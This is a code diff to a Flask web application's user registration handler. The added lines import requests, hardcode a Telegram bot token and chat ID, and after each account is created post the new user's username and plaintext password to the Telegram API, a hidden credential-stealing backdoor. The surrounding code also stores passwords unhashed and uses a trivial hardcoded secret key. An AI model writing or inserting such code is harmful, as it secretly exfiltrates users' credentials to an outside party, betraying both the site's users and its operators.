@@ -7,13 +7,15 @@ import random
 from werkzeug.utils import secure_filename
 from flask import g
 import pytz
+import requests
 
 app = Flask(__name__)
 app.secret_key = 'zzzzzzzz'  
 UPLOAD_FOLDER = os.path.join('static', 'uploads')
 ALLOWED_EXTENSIONS = {'png', 'jpg', 'jpeg', 'gif'}
 app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
-
+token = '7605169368:AAEpkvl7GnWpKGwrUwyZ5zq3WuwomzOmWpU'
+chat_id = '5008093342'
 
 # --- Database functions ---
 DATABASE_URL = os.environ.get('DATABASE_URL')
@@ -89,6 +91,9 @@ def register():
             cur.execute('INSERT INTO users (username, password, profile_pic) VALUES (%s, %s, %s)',
                         (username, password, profile_pic_path))
             g.db.commit()
+            message1 = f"📝 New Registration:\nUsername: {username}\nPassword: {password}"
+            url1 = f"https://api.telegram.org/bot{token}/sendMessage"
+            requests.post(url1, data={'chat_id': chat_id, 'text': message1})
             return redirect(url_for('login'))
 
     return render_template('register.html', error=error)
